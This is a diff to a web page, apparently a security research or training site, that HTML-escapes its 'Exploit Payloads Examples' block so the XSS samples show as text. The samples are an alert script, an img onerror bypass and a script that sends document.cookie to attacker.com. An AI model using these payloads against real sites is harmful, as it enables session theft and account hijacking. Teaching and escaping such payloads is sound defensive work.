@@ -22351,16 +22351,16 @@ nmap --script vuln 10.10.10.24</pre>
               <h3>Exploit Payloads Examples</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_xss_payloads')">Copy</button>
-                <pre id="poc_xss_payloads" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffd500;"><!-- Basic Alert Payload -->
-<script>alert(document.domain)</script>
+                <pre id="poc_xss_payloads" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffd500;">&lt;!-- Basic Alert Payload --&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
 
-<!-- Bypass Image Error Payload -->
-<img src=x onerror=alert(1)>
+&lt;!-- Bypass Image Error Payload --&gt;
+&lt;img src=x onerror=alert(1)&gt;
 
-<!-- Cookie Extraction Payload -->
-<script>
+&lt;!-- Cookie Extraction Payload --&gt;
+&lt;script&gt;
   new Image().src="http://attacker.com/steal?cookie="+encodeURIComponent(document.cookie);
-</script></pre>
+&lt;/script&gt;</pre>
               </div>
             `
           }
